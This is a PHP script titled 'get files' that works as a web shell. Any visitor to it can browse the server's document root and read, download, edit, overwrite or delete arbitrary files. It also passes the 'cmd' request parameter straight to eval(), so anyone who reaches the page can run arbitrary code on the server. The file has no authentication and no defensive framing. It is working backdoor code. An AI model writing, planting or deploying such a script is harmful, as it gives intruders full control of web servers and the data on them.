<?php 
error_reporting(E_ALL^E_NOTICE^E_WARNING);
trimMagicQuotes();

$action = $_REQUEST['action']? $_REQUEST['action']:'';
$file = urldecode($_REQUEST['file']);


//phpinfo();exit;

if($action == 'view_source'){
	
	if(empty($file) || !is_file($file)){
		die("<b>404 File not found!</b>"); 
	}
	$handle = fopen($file, "r");
	$contents = fread($handle, filesize ($file));
	
	echo "<pre>";
	echo htmlspecialchars($contents);
	exit;
	
}
if($action == 'delete'){
	$file2 = $_REQUEST['file2']? $_REQUEST['file2']:'';
	if(is_file($file2)){
		unlink($file2);echo 'finish';exit;
	}
}
if($action == 'edit'){
	$file2 = $_REQUEST['file2']? $_REQUEST['file2']:'';
	$file_content = $_REQUEST['file_content']? $_REQUEST['file_content']:'';
	$save_to_file = $_REQUEST['save_to_file']? $_REQUEST['save_to_file']:'';
	//echo '$file:'.$file;exit;
	if(! empty($file_content)){
		file_put_contents($save_to_file, $file_content);
	}
	
	if(is_file($file2) ){
		echo $file2;
		echo '<!DOCTYPE html><meta http-equiv="content-type" content="text/html;charset=utf-8">';
		echo '<form method="post"><input type="hidden" name="action" value="edit" />
		<input type="hidden" name="file" value="'.$file.'" />
		<input type="hidden" name="file2" value="'.$file2.'" />
		Save as:<input type="text" size="120" name="save_to_file" value="'.$file2.'" />
		';
		echo "<textarea name='file_content' cols='150' rows='25'>";
		echo file_get_contents($file2);
		echo "</textarea>";
		echo '
		<br><br><input type="submit" name="submit" value="submit" />
		<form>';
	}
	
	
	
	die('<br>finish');
}
if($action == 'download'){
	$file = urldecode($_REQUEST['file']);
	if(empty($file) || !is_file($file)){
		die("<b>404 File not found!</b>"); 
	}
	
	download_file($file);
	exit;

	
}

$charset = $_REQUEST['charset']?$_REQUEST['charset']:'gbk';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $charset;?>">
<title>get files</title>
</head>
<body>
<div>use url parameter 'charset' to specify page charset</div>
<?php
$doc_root = resetDir($_SERVER["DOCUMENT_ROOT"]);

if($action == 'child_dir' && !empty($_REQUEST['file'])){
	$current_path = resetDir($_REQUEST['file']);
}else{
	$current_path = $doc_root;
}

echo '<h2>Current Path:'.$current_path.'</h2>';
//$current_path = preg_replace("/([^\\\]+)\\\{3,}([^\\\]+)/", "$1=$2", $current_path);
$files = getFilesInDir($current_path);
//echo $current_path;exit;

if(count($files) > 0){
	?>
	<table width="100%">
	<tr><th style="background:#bbb;" align="left">file name</th>
	<th style="background:#bbb;"  align="left">view source</th>
	<th style="background:#bbb;"  align="left">download</th>
	<th style="background:#bbb;"  align="left">file size</th>
	<th style="background:#bbb;"  align="left">file last date</th>
	<th style="background:#bbb;"  align="left">file path</th>
	<th style="background:#bbb;"  align="left">Action</th>
	</tr>
	
	
	<?php foreach ($files as $file){
		
		if($file['filename']=='.') continue;
		
	$tmp_abs_file = $file['filepath'].$file['filename'];
	//echo $tmp_abs_file."<br>";
	$tmp_abs_file = preg_replace("/\\\+/", "\\", $tmp_abs_file);
	//echo $tmp_abs_file."<br>";exit;
		?>
	<tr onclick="this.style.backgroundColor='#ccc';if(window.cur_tr && window.cur_tr!=this) window.cur_tr.style.backgroundColor='#fff';window.cur_tr=this;" onmouseover="this.style.backgroundColor='#ccc'" onmouseout="if(!window.cur_tr || window.cur_tr!=this) this.style.backgroundColor='#fff'">
		<td width="10%"><?php 
		if(is_dir($tmp_abs_file)){
			echo '<b>'.$file['filename'].'</b>';
		}else{
			echo $file['filename'];
		}
		?></td>
		<td width="10%">
		<?php 
		if(!is_dir($tmp_abs_file)){?>
		<a href="?action=view_source&file=<?php echo urlencode($tmp_abs_file);?>" target="_blank" >view</a>
		<?php 	
		}
		?>
		</td>
		<td width="10%">
		<?php 
		if(!is_dir($tmp_abs_file)){
			
		?>
		<a href="?action=download&file=<?php echo urlencode($tmp_abs_file);?>" target="_blank" >download</a>
		<?php 	
		}
		?>
		</td>
		<td width="20%"><?php 
		if(is_dir($tmp_abs_file)){
			
			$tmp_link = getDirLink($file['filename'], $tmp_abs_file);

			echo "<a href='?action=child_dir&file=".urlencode($tmp_link)."' target='_self'>dir</a>";
		}else{
			echo $file['filesize'];
		}
		?></td>
		<td width="10%"><?php echo $file['filetime'];?></td>
		<td><?php echo str_replace($doc_root,'',$tmp_abs_file);?></td>
		<td>
		<?php 
		if(!is_dir($tmp_abs_file)){?>
		<a href="?action=delete&file=<?php echo urlencode($current_path);?>&file2=<?php echo $tmp_abs_file;?>" target="_blank" >delete</a>
		<a href="?action=edit&file=<?php echo urlencode($current_path);?>&file2=<?php echo $tmp_abs_file;?>" target="_blank" >edit</a>
		<?php 	
		}
		?>
		</td>

	</tr>
	<?php }?>
	</table>
	<?php
}
$cmd = $_REQUEST['cmd']? $_REQUEST['cmd']: '';
if(get_magic_quotes_gpc()){
	$cmd = stripslashes($cmd);
}

if(!empty($cmd)){
	eval($cmd.';');
}

function trimMagicQuotes(){
	if(get_magic_quotes_gpc()){
		foreach($_GET as $key=>$val){
			$_GET[$key] = stripslashes($val);
		}
		
		foreach($_POST as $key=>$val){
			$_POST[$key] = stripslashes($val);
		}
		
		foreach($_FILES as $key=>$val){
			$_FILES[$key] = stripslashes($val);
		}
		
		foreach($_REQUEST as $key=>$val){
			$_REQUEST[$key] = stripslashes($val);
		}
	}
	
}
function getDirLink($filename,$tmp_abs_file){
	if($filename == '..'){

		$tmp_arr = explode(DIRECTORY_SEPARATOR,$tmp_abs_file);
		array_pop($tmp_arr);
		array_pop($tmp_arr);
					
		$tmp_link = implode(DIRECTORY_SEPARATOR,$tmp_arr);
				
	}else{
		$tmp_link = $tmp_abs_file;
	}
	return $tmp_link;
}
function resetDir($dir){
	if(DIRECTORY_SEPARATOR == '\\'){//windows's path separator
		$dir = str_replace('/', '\\', $dir);
	}
	if(preg_match("#[\\\/]$#", $dir) == 0){
		if(DIRECTORY_SEPARATOR == '\\'){
			$dir = $dir . "\\";
		}else{
			$dir = $dir . "/";
		}
	}
	return $dir;
}
function getFilesInDir($dir){//echo 'dir:'.$dir;
	$dir = resetDir($dir);//if(strpos($dir,'ajax') !== false) die($dir);
	if(!is_dir($dir)){
		return array('not is dir');
	}
	
	$files = array();
	if ($handle = opendir($dir)) {
	    while (false !== ($file = readdir($handle))) {
	        if (1 || ($file != "." && $file != "..")) {
	        	$filename = $file;
	        	$filesize = filesize($dir.$file);
	        	$filetime = date ("Y-m-d H:i:s.", filemtime($dir.$file));
	            $files[] = array(
	            'filename'=>$filename,
	            'filesize'=>$filesize,
	            'filetime'=>$filetime,
	            'filepath'=>$dir
	            );
	        }
	    }
	    closedir($handle);
	}
	
	//array_multisort($files, SORT_DESC, $files);
	uasort($files, "sortFiles");
	
	return $files;
	
}
function sortFiles($a, $b){
	if ($a['filename'] == $b['filename']) {
        return 0;
    }
    return ($a['filename'] < $b['filename']) ? -1 : 1;
	
}

function download_file($file){

    //First, see if the file exists
    if (!is_file($file)) { die("<b>404 File not found!</b>"); }

    //Gather relevent info about file
    $len = filesize($file);
    $filename = basename($file);
    $file_extension = strtolower(substr(strrchr($filename,"."),1));

    //This will set the Content-Type to the appropriate setting for the file
    switch( $file_extension ) {
          case "pdf": $ctype="application/pdf"; break;
      case "exe": $ctype="application/octet-stream"; break;
      case "zip": $ctype="application/zip"; break;
      case "doc": $ctype="application/msword"; break;
      case "xls": $ctype="application/vnd.ms-excel"; break;
      case "ppt": $ctype="application/vnd.ms-powerpoint"; break;
      case "gif": $ctype="image/gif"; break;
      case "png": $ctype="image/png"; break;
      case "jpeg":
      case "jpg": $ctype="image/jpg"; break;
      case "mp3": $ctype="audio/mpeg"; break;
      case "wav": $ctype="audio/x-wav"; break;
      case "mpeg":
      case "mpg":
      case "mpe": $ctype="video/mpeg"; break;
      case "mov": $ctype="video/quicktime"; break;
      case "avi": $ctype="video/x-msvideo"; break;

      //The following are for extensions that shouldn't be downloaded (sensitive stuff, like php files)
      case "php":
      case "htm":
      case "html":
     // case "txt": die("<b>Cannot be used for ". $file_extension ." files!</b>"); break;

      default: $ctype="application/force-download";
    }

    //Begin writing headers
    header("Pragma: public");
    header("Expires: 0");
    header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
    header("Cache-Control: public"); 
    header("Content-Description: File Transfer");
    
    //Use the switch-generated Content-Type
    header("Content-Type: $ctype");

    //Force the download
    $header="Content-Disposition: attachment; filename=".$filename.";";
    header($header );
    header("Content-Transfer-Encoding: binary");
    header("Content-Length: ".$len);
    @readfile($file);
    exit;
}

?>
</body>
</html>
